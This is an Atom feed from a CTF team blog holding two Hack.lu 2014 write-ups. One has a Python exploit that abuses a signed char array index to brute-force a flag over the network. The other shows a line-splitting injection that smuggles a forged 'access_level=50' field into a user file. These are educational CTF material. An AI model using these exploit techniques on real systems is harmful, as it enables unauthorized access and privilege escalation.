<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploiting | CaptchaFlag CTF Team]]></title>
  <link href="http://www.captchaflag.com/blog/categories/exploiting/atom.xml" rel="self"/>
  <link href="http://www.captchaflag.com/"/>
  <updated>2014-10-28T17:44:42-04:00</updated>
  <id>http://www.captchaflag.com/</id>
  <author>
    <name><![CDATA[Captchaflag]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Guess the Flag]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/"/>
    <updated>2014-10-28T15:05:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Look at that guy over there! He's a bandit from the group that robs the
stagecoaches in unpredictable intervals. I think he hasn't been with them for
very long, so he can't tell whether you're one of them. Try to look like a
bandit and talk to him. He probably won't just tell you their plan for the
attack, but maybe you can ask him some questions?</p>

<p>nc wildwildweb.fluxfingers.net 1412</p>

<h3>Partial Source</h3>

<p>```c
int is<em>flag</em>correct(char <em>flag_hex /</em> the user's guess in hex */) {
  if (strlen(flag<em>hex) != 100) {
    printf(&quot;bad input, that hexstring should be 100 chars, but was %d chars long!\n&quot;, (int)strlen(flag</em>hex));
    exit(0);
  }</p>

<p>char bin<em>by</em>hex[256] = { /* table for looking up the value of a hex character – -1 means invalid <em>/
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
     0,  1,  2,  3,  4,  5,  6,  7,  8,  9, -1, -1, -1, -1, -1, -1, /</em> 0-9 <em>/
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /</em> A-F <em>/
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, 10, 11, 12, 13, 14, 15, -1, -1, -1, -1, -1, -1, -1, -1, -1, /</em> a-f */
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
  };</p>

<p>/* the correct flag was censored out */
  char flag[50] = &quot;flag{0123456789abcdef0123456789abcdef0123456789ab}&quot;;</p>

<p>// decode flag<em>hex into given</em>flag so we can compare them
  char given<em>flag[50];
  bzero(given</em>flag, 50);
  for (int i=0; i&lt;50; i++) {
    char value1 = bin<em>by</em>hex[flag<em>hex[i*2  ]];
    char value2 = bin</em>by<em>hex[flag</em>hex[i*2+1]];
    if (value1 == -1 || value2 == -1) {
      printf(&quot;bad input – one of the characters you supplied was not a valid hex character!\n&quot;);
      exit(0);
    }
    given_flag[i] = (value1&lt;&lt;4) | value2;
  }</p>

<p>// timing-safe comparison of the two flags
  char diff = 0;
  for (int i=0; i&lt;50; i++) {
    diff |= (flag[i] ^ given_flag[i]);
  }</p>

<p>return (diff == 0);
}
```</p>

<h2>Analysis</h2>

<p>A visual inspection of the source code raised some potential issues, but they
were all red herrings. For instance, the rtrim() function increments by 2
instead of one, but that doesn't buy us anything:</p>

<p><code>c
void rtrim(char *str) {
  for (char *p = str+strlen(str)-1; p&gt;=str; p--) {
    if (!strchr(&quot; \r\n&quot;, *p)) break;
    *p = '\0';
    p--;
  }
}
</code></p>

<p>The challenge prompt says to compile the source with <code>gcc -std=gnu99 -g</code>, but
we added <code>-Wall and -Wextra</code> and compiled:</p>

<p><code>text
guess_the_flag_censored.c:51:3: warning: implicit declaration of function ‘bzero’ [-Wimplicit-function-declaration]
   bzero(given_flag, 50);
   ^
guess_the_flag_censored.c:53:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value1 = bin_by_hex[flag_hex[i*2  ]];
     ^
guess_the_flag_censored.c:54:5: warning: array subscript has type ‘char’ [-Wchar-subscripts]
     char value2 = bin_by_hex[flag_hex[i*2+1]];
     ^
</code></p>

<p>Joy! an array is indexed with a character type, which is treated as a signed
value. The focus is now on exploiting that in order to access or change the
<code>flag</code> which is also stored on the stack. The potentially negative indicies are
only used when reading, which eliminates the possibility of injecting
shellcode. This seemed to be a let-down at first, but what we do see is that
the <code>value1</code> and <code>value2</code> variables can be influenced. This leads to the
population of the <code>given_flag</code> string. Can we force <code>given_flag</code> to be accepted
by copying the bytes from <code>flag</code>?</p>

<h2>Solution</h2>

<p>We ran the program locally under a debugger to discover that <code>flag</code> is located
128 bytes before <code>bin_by_hex</code>. Subtract the &quot;flag{&quot; prefix, and the offset for
the 44 byte hexadecimal string is at offset -123. The following code generates
an input which should exploit the defect:</p>

<p>```python</p>

<h1>!/usr/bin/env python</h1>

<p>import sys</p>

<p>start = -123</p>

<h1>Python doesn't support chr(-x), so do unsigned -&gt; signed conversion.</h1>

<p>def twos_comp(n):
    return 256 + n</p>

<h1>Generate a flag which exploits the char-index defect. This flag should always</h1>

<h1>work, even though it is an invalid format.</h1>

<h1>In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</h1>

<p>def generate<em>flag():
    s = twos</em>comp(start)
    # This request causes server to copy the hidden flag; instead of expanding hex
    #   - Put a zero in the high order nibble
    #   - Place negative offset of this flag char in low-order
    return ['0' + chr(s + i) for i in xrange(44)]</p>

<h1>Format the flag and encode it for the wire</h1>

<p>def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'</p>

<p>sys.stdout.write(encode<em>flag(generate</em>flag()))
```</p>

<p>The output ends up looking like: <code>666c61677b0\x850\x860\x870\x88...</code> where
<code>666c61677b</code> is the encoded &quot;flag{&quot;, the zero nibbles corresponds to <code>value1</code>,
and the 0x85,0x86,... are negative integers corresponding to <code>value2</code>. This
leads to populating <code>given_flag</code> as:
<code>c
for (i=0; i&lt;50; i++) { given_flag[i] = (0&lt;&lt;4) | flag[i] }
</code></p>

<p>Sure enough, this payload works locally, but it fails remotely. Is the system
employing ASLR? Is the layout static, but different somehow? We could write
code to guess the offset, but let's just see what happens if we assume the
system is 32-bit. Compile with <code>-m32</code> and we see the offset is now 64 bytes
instead of 128. Therefore, we change start from -123 to -59. This change works
against the server and we now see: &quot;Yaaaay! You guessed the flag correctly! But
do you still remember what you entered? If not, feel free to try again!&quot;</p>

<p>We don't have the flag, but we do have a way to test each byte in isolation. We
start with the payload we generated, and try all hexadecimal values [0-9a-f]
for the first character until the correct one is found. Then, repeat with the
second character, until the last (44th) character is verified. Therefore, the
problem space is greatly reduced from 16^44 to 16*44; 50 orders of magnitude.</p>

<p>The complete solution is listed below:
```text</p>

<h1>!/usr/bin/env python</h1>

<p>import sys, socket</p>

<h1>stack location of flags var, relative to bit_to_hex</h1>

<p>start = -59            # For 64-bit machines replace with: -123
host  = 'wildwildweb.fluxfingers.net'
port  = 1412</p>

<h1>Python doesn't support chr(-x), so do unsigned -&gt; signed conversion.</h1>

<p>def twos_comp(n):
    return 256 + n</p>

<h1>Generate a flag which exploits the char-index defect. This flag should always</h1>

<h1>work, even though it is an invalid format.</h1>

<h1>In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</h1>

<p>def generate_flag():
    s = twos_comp(start)
    # This request causes server to copy the hidden flag; instead of expanding hex
    #   - Put a zero in the high order nibble
    #   - Place negative offset of this flag char in low-order
    return ['0' + chr(s + i) for i in xrange(44)]</p>

<h1>Format the flag and encode it for the wire</h1>

<p>def encode_flag(f):
    return 'flag{'.encode('hex') + \
           ''.join(f) + \
           '}'.encode('hex') + '\n'</p>

<h1>Were we successful?</h1>

<p>def check_resp(r):
    return r.startswith('Yaaaay')</p>

<h1>Were we successful (for the prior request)?</h1>

<p>def check_sock(s):
    rv = check_resp(s.recv(1024))
    return rv</p>

<h1>Send a flag to the server</h1>

<p>def send_flag(s, f):
    # Eat the prompt
    s.recv(1024)
    # Bonvoyage!
    s.send(encode_flag(f))</p>

<h1>Connect</h1>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))</p>

<h1>Eat the MOTD</h1>

<p>print s.recv(1024)</p>

<h1>This flag should work, as long as the offset is correct</h1>

<p>base = generate_flag()</p>

<p>print &quot;VERIFYING FLAG OFFSET...&quot;
send_flag(s, base)
if check_sock(s):
    print &quot;  Success!&quot;
else:
    print &quot;  Failed!&quot;
    sys.exit(1)</p>

<h1>Accumulate the flag as it is discovered</h1>

<p>discovered = []</p>

<p>for i in xrange(len(base)):
    mutant = base[:]
    disc_byte = '??'
    for j in '0123456789abcdef':
        byte = j.encode('hex')
        mutant[i] = byte</p>

<pre><code>    send\_flag(s, mutant)
    if check\_sock(s):
        disc\_byte = byte
        print &quot;%d -&gt; 0x%s&quot; % (i, byte)
        break
discovered += disc\_byte
</code></pre>

<p>print &quot;VERIFYING FINAL FLAG...&quot;
send_flag(s, discovered)
if check_sock(s):
    print &quot;  Success! The flag is: %s&quot; % encode_flag(discovered)
else:
    print &quot;  Failed!&quot;
```</p>

<p>The result is
<code>text
666c61677b3639373437333661373537
33373436633639366236353639366537
34363836353664366637363639363537
337d
</code>
Decode, and we get &quot;flag{6974736a7573746c696b65696e7468656d6f76696573}&quot;.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Personnel Database]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-personnel-database/"/>
    <updated>2014-10-23T10:23:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-personnel-database</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Lots of criminals in this area work for one big boss, but we have been unable to
determine who he is. We know that their organization has one central personnel
database that might also contain information about their boss, whose username is
simply “boss”. However, when you register in their system, you only get access
level zero, which is not enough for reading data about the boss - that guy is
level 10. Do you think you can get around their protections? </p>

<p>Download</p>

<p>nc wildwildweb.fluxfingers.net 1410</p>

<p>Note: The users dir will be wiped every 5 minutes.</p>

<h2>Analysis</h2>

<p>Downloading the file gives us:</p>

<p>```c</p>

<h1>include <stdio.h></h1>

<h1>include <stdlib.h></h1>

<h1>include <stdbool.h></h1>

<h1>include <string.h></h1>

<h1>include <errno.h></h1>

<h1>include <arpa/inet.h></h1>

<h1>include <sys/socket.h></h1>

<h1>include <netinet/in.h></h1>

<h1>include <sys/types.h></h1>

<h1>include <unistd.h></h1>

<h1>include <stdint.h></h1>

<h1>include <sys/stat.h></h1>

<h1>include <fcntl.h></h1>

<p>static uint32<em>t crc32</em>tab[] = {
  0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
  0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
  0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
  0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
  0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
  0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
  0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
  0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
  0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
  0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
  0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
  0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
  0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
  0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
  0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
  0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
  0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
  0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
  0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
  0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
  0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
  0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
  0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
  0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
  0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
  0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
  0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
  0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
  0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
  0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
  0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
  0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
  0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
  0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
  0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
  0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
  0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
  0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
  0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
  0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
  0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
  0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
  0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};</p>

<p>// no. you're <em>not</em> supposed to bruteforce this challenge. 2^32 is still a
// bit much.
uint32<em>t hash</em>password(const char *p) {
  size<em>t size = strlen(p);
  uint32</em>t crc = 0;
  crc = crc ^ ~0U;</p>

<p>while (size--)
    crc = crc32_tab[(crc ^ *p++) &amp; 0xFF] ^ (crc &gt;&gt; 8);</p>

<p>return crc ^ ~0U;
}</p>

<p>// usernames must match /^[a-zA-Z0-9<em>]{1,20}$/
bool username</em>sane(char <em>user) {
  if (strlen(user) &gt; 20) return false;
  if (</em>user == '\0') return false;
  for (char <em>p = user; *p; p++) {
    if (</em>p &gt;= 'a' &amp;&amp; <em>p &lt;= 'z') continue;
    if (</em>p &gt;= 'A' &amp;&amp; <em>p &lt;= 'Z') continue;
    if (</em>p &gt;= '0' &amp;&amp; <em>p &lt;= '9') continue;
    if (</em>p == '_') continue;
    return false;
  }
  return true;
}</p>

<p>void rtrim(char <em>str) {
  for (char *p = str+strlen(str)-1; p &gt;= str; p--) {
    if (</em>p != '\r' &amp;&amp; *p != '\n' &amp;&amp; *p != ' ' &amp;&amp; *p != '\t') return;
    *p = '\0';
  }
}</p>

<p>int open<em>userfile(char *user, int flags) {
  if (!username</em>sane(user)) { errno = EACCES; return -1; }</p>

<p>// construct path: &quot;users/{username}&quot;
  char path[6+20+1] = &quot;users/&quot;;
  strcpy(path+6, user);</p>

<p>return open(path, flags, 0700);
}</p>

<p>struct userdata {
  uint32<em>t hash;
  unsigned int access</em>level;
  char description[512];
};</p>

<p>struct userdata <em>read_userfile(char *user) {
  struct userdata *res = calloc(1, sizeof(</em>res));
  if (res == NULL) return NULL;
  int fd = open<em>userfile(user, O</em>RDONLY);
  if (fd == -1) return NULL;
  FILE *f = fdopen(fd, &quot;r&quot;);
  if (f == NULL) { close(fd); return NULL; }
  char line[256];
  while (fgets(line, sizeof(line), f)) {
    rtrim(line);
    char *key = line;
    char *eqsign = strchr(line, '=');
    if (!eqsign) continue;
    *eqsign = '\0';
    char *value = eqsign+1;</p>

<pre><code>if (!strcmp(key, &quot;hash&quot;)) res-&gt;hash = atoll(value);
else if (!strcmp(key, &quot;access_level&quot;)) res-&gt;access_level = atoi(value);
else if (!strcmp(key, &quot;description&quot;)) strcpy(res-&gt;description, value);
else printf(&quot;fatal error: bad key \&quot;%s\&quot; in config, aborting\n&quot;, key), exit(1);
</code></pre>

<p>}
  return res;
}</p>

<p>void write<em>userfile(char *user, struct userdata *ud) {
  int fd = open</em>userfile(user, O<em>WRONLY|O</em>TRUNC);
  if (fd == -1) perror(&quot;can't open userdata&quot;), exit(1);
  FILE *f = fdopen(fd, &quot;w&quot;);
  if (f == NULL) perror(&quot;can't fdopen userdata&quot;), exit(1);
  fprintf(f, &quot;hash=%llu\n&quot;, (unsigned long long)ud-&gt;hash);
  fprintf(f, &quot;access<em>level=%u\n&quot;, ud-&gt;access</em>level);
  fprintf(f, &quot;description=%s\n&quot;, ud-&gt;description);
  fclose(f);
}</p>

<p>void handle(int s) {
  alarm(60);</p>

<p>// Let's handle the socket like a normal terminal or so. Makes the code much
  // nicer. :)
  if (dup2(s, 0)==-1 || dup2(s, 1)==-1) exit(1);
  setbuf(stdout, NULL);</p>

<p>char username[21] = &quot;&quot;;
  struct userdata *ud = NULL;
  bool logged_in = false;</p>

<p>char line[512]; /* last incoming command */
  while (printf(&quot;&gt; &quot;), fgets(line, sizeof(line), stdin)) {
    rtrim(line);
    char *cmd = line;
    char *params = strchr(line, ' ');
    if (params) {
      *params = '\0';
      params++;
    }
    if (!strcmp(cmd, &quot;whoami&quot;)) {
      printf((logged<em>in?&quot;You are logged in as %s.\n&quot;:&quot;You are not logged in.\n&quot;), username);
    } else if (!strcmp(cmd, &quot;user&quot;)) {
      if (!params || !username</em>sane(params)) { printf(&quot;missing/bad username\n&quot;); continue; }
      strcpy(username, params);
      free(ud);
      logged<em>in = false;
      ud = read</em>userfile(username);
      if (ud) {
        printf(&quot;username accepted, please provide password\n&quot;);
      } else {
        perror(&quot;username not accepted&quot;);
      }
    } else if (!strcmp(cmd, &quot;pass&quot;)) {
      if (!ud) { printf(&quot;invalid request\n&quot;); continue; }
      if (!params) { printf(&quot;missing password\n&quot;); continue; }
      if (hash<em>password(params) == ud-&gt;hash) {
        printf(&quot;login ok\n&quot;);
        logged</em>in = true;
      } else {
        printf(&quot;you accidentially mistyped your password, please try again\n&quot;);
      }
    } else if (!strcmp(cmd, &quot;register&quot;)) {
      if (!params) { printf(&quot;missing arguments\n&quot;); continue; }
      char *pass = strchr(params, ':');
      if (!pass) { printf(&quot;missing password\n&quot;); continue; }
      *pass = '\0';
      pass++;
      if (strlen(pass) &lt; 8) { printf(&quot;password too short\n&quot;); continue; }
      int fd = open<em>userfile(params, O</em>WRONLY|O<em>EXCL|O</em>CREAT);
      if (fd == -1) { printf(&quot;unable to create user: %s\n&quot;, strerror(errno)); close(fd); continue; }
      close(fd);</p>

<pre><code>  strcpy(username, params);
  ud = calloc(1, sizeof(*ud));
  logged_in = true;
  ud-&gt;hash = hash_password(pass);
  printf(&quot;user created successfully\n&quot;);
} else if (!strcmp(cmd, &quot;logout&quot;)) {
  if (!logged_in) { printf(&quot;you're not even logged in, how could you log out?\n&quot;); continue; }
  logged_in = false;
  write_userfile(username, ud);
  *username = '\0';
  free(ud); ud = NULL;
  printf(&quot;Uh, who are you again? I have forgotten.\n&quot;);
} else if (!strcmp(cmd, &quot;whois&quot;)) {
  if (!logged_in) { printf(&quot;you must be logged in for this\n&quot;); continue; }
  if (!params) { printf(&quot;missing username&quot;); continue; }
  struct userdata *ud_ = read_userfile(params);
  if (!ud_) {perror(&quot;unable to read userdata&quot;); continue; }
  if (ud_-&gt;access_level &gt;= ud-&gt;access_level) {
    printf(&quot;your access level is too low. sending bandit team to your location.\n&quot;);
    free(ud_);
    continue;
  }
  printf(&quot;user\t%s\nlevel\t%u\ndescr\t\&quot;%s\&quot;\n&quot;, params, ud_-&gt;access_level, ud_-&gt;description);
  free(ud_);
} else if (!strcmp(cmd, &quot;levelup&quot;)) {
  if (!logged_in) { printf(&quot;you must be logged in for this\n&quot;); continue; }
  if (!params) { printf(&quot;missing username&quot;); continue; }
  struct userdata *ud_ = read_userfile(params);
  if (!ud_) {perror(&quot;unable to read userdata&quot;); continue; }
  if (ud_-&gt;access_level &gt;= ud-&gt;access_level) {
    printf(&quot;your access level is too low for that! sending bandit team to your location.\n&quot;);
    free(ud_);
    continue;
  }
  ud_-&gt;access_level++;
  write_userfile(params, ud_);
  printf(&quot;user promoted to level %u\n&quot;, ud_-&gt;access_level);
  free(ud_);
} else if (!strcmp(cmd, &quot;set_description&quot;)) {
  if (!logged_in) { printf(&quot;you must be logged in for this\n&quot;); continue; }
  if (!params) { printf(&quot;missing description\n&quot;); continue; }
  strcpy(ud-&gt;description, params);
  printf(&quot;description set\n&quot;);
} else {
  printf(&quot;unknown command\n&quot;);
}
</code></pre>

<p>}
}</p>

<p>int main(void) {
  int s = socket(AF<em>INET6, SOCK</em>STREAM, 0);
  if (s == -1) perror(&quot;unable to create server socket&quot;), exit(1);
  struct sockaddr<em>in6 bind</em>addr = {
    .sin6<em>family = AF</em>INET6,
    .sin6<em>port = htons(1410)
  };
  if (bind(s, (struct sockaddr *)&amp;bind</em>addr, sizeof(bind_addr))) perror(&quot;unable to bind socket&quot;), exit(1);
  if (listen(s, 0x10)) perror(&quot;deaf&quot;), exit(1);</p>

<p>while (1) {
    int s_ = accept(s, NULL, NULL);
    if (s_ == -1) {
      perror(&quot;accept failed, is this bad?&quot;); /* On Error Resume Next */
      continue;
    }
    pid<em>t child</em>pid = fork();
    if (child<em>pid == -1) {
      perror(&quot;can't fork! that's bad, I think.&quot;);
      close(s</em>);
      sleep(1);
      continue;
    }
    if (child<em>pid == 0) close(s), handle(s</em>), exit(0);
    close(s_);
  }
}</p>

<p>```</p>

<h2>Solution</h2>

<p>The <code>read_userfile()</code> function reads lines 256 bytes at a time.  However, when
writing the file you can write descriptions close to 512 bytes.  This allows you
to write long lines that will be treated as two lines by <code>read_userfile()</code>.
Since the original <code>access_level=0</code> line is written before the description, an
additional line can overwrite the <code>access_level</code> variable.</p>

<p>```c
 struct userdata <em>read_userfile(char *user) {
   struct userdata *res = calloc(1, sizeof(</em>res));
   if (res == NULL) return NULL;
   int fd = open<em>userfile(user, O</em>RDONLY);
   if (fd == -1) return NULL;
   FILE *f = fdopen(fd, &quot;r&quot;);
   if (f == NULL) { close(fd); return NULL; }
   char line[256];
   while (fgets(line, sizeof(line), f)) {
     rtrim(line);
     char *key = line;
     char *eqsign = strchr(line, '=');
     if (!eqsign) continue;
     *eqsign = '\0';
     char *value = eqsign+1;</p>

<pre><code> if (!strcmp(key, &quot;hash&quot;)) res-&gt;hash = atoll(value);
 else if (!strcmp(key, &quot;access_level&quot;)) res-&gt;access_level = atoi(value);
 else if (!strcmp(key, &quot;description&quot;)) strcpy(res-&gt;description, value);
 else printf(&quot;fatal error: bad key \&quot;%s\&quot; in config, aborting\n&quot;, key), exit(1);
</code></pre>

<p>}
   return res;
 }</p>

<p>```</p>

<p><code>
$ nc wildwildweb.fluxfingers.net 1410
&gt; register test:password
user created successfully
&gt; set_description  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccess_level=50
description set
&gt; logout
Uh, who are you again? I have forgotten.
&gt; user test
username accepted, please provide password
&gt; pass password
login ok
&gt; whois boss
user  boss
level   10
descr   &quot;flag{this_is_why_gets_is_better_than_fgets}&quot;
&gt;
$ 
</code></p>
]]></content>
  </entry>
  
</feed>
